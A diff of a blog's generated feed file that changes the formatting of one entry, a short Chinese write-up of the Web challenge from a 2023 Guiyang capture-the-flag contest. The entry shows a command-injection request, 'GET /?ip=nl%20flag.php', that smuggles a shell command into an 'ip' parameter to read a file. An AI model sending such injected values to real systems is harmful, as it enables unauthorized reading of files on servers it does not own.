@@ -33,7 +33,7 @@
       <link href="/2023/05/04/2023%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9BWP/"/>
       <url>/2023/05/04/2023%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9BWP/</url>
       
-        <content type="html"><![CDATA[<blockquote><p>贵阳线下约饭局，线下赛是模拟靶场，难度一般，断网比较坑…</p></blockquote><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>扫描文件发现flag.php，利用nl读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?ip=nl%20flag.php</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119121633727.png" alt="image-20241119121633727"></p>]]></content>
+        <content type="html"><![CDATA[<p>贵阳线下约饭局，线下赛是模拟靶场，难度一般，断网比较坑…</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>扫描文件发现flag.php，利用nl读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?ip=nl%20flag.php</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119121633727.png" alt="image-20241119121633727"></p>]]></content>
       
       
       <categories>
